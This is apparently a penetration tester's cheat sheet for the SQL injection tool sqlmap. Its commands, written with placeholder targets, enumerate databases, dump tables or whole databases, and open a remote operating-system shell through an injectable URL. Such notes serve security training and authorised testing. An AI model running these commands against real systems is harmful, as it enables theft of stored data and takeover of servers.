# sqlmap

> Automated SQL injection.

---

## Run off an HTTP request

1. Use Burpsuite to capture an innocent request to the vulnerable URL
2. Copy that request to a text file (right-click request body and select `Copy to file`)
3. Run `sqlmap`

```bash
sqlmap -r $REQUEST_TEXT_FILE [any of the options below]
```

---

## Specify an Injection Technique

```bash
sqlmap --technique=$TECHNIQUE_STRING $OTHER_ARGS
```

- `$TECHNIQUE_STRING` by default is `BEUSTQ`, where each letter stands for a different technique `sqlmap` can use:
	- `B`: [[blind-sql-injection#Boolean-based SQL Injection|boolean-based blind injection]]
	- `E`: [[blind-sql-injection#Error-based Blind SQL Injection|error-based blind injection]]
	- `Q`: typical query
	- `S`: stacked query 
	- `T`: [[blind-sql-injection#Time-based Blind SQL Injection|time-based blind injection]]
	- `U`: [[union-attack|union-based injection]]

---

## Crawl web application

```bash
sqlmap -u $URL --crawl=1
```

---

## Show existing database names

```bash
sqlmap -u $SQL_INJECTABLE_URL?$VULN_PARAM=$ANY_VALUE --dbs
```

---

## Show a database's table names

```bash
sqlmap -u $SQL_INJECTABLE_URL?$VULN_PARAM=$ANY_VALUE --tables -D $DATABASE_NAME
```

---

## Show a table's column names

```bash
sqlmap -u $SQL_INJECTABLE_URL $VULN_PARAM=$ANY_VALUE --columns -D $DATABASE_NAME -T $TABLE_NAME
```

---

## Dump a table

```bash
sqlmap -u $SQL_INJECTABLE_URL $VULN_PARAM=$ANY_VALUE --dump -D $DATABASE_NAME -T $TABLE_NAME
```

---

## Dump any database `sqlmap` can find from SQL-injectable URL

```bash
sqlmap -u $SQL_INJECTABLE_URL $VULN_PARAM=$ANY_VALUE --dbms=$DBMS --dump --threads=5
```

---

## Gain remote shell from SQL-injectable URL

```bash
sqlmap -u $SQL_INJECTABLE_URL $VULN_PARAM=$ANY_VALUE --dbms=$DBMS --os-shell
```

---

## Can't find anything?

Try `--level=[1|2|3]` and/or `--risk=[1|2|3]`
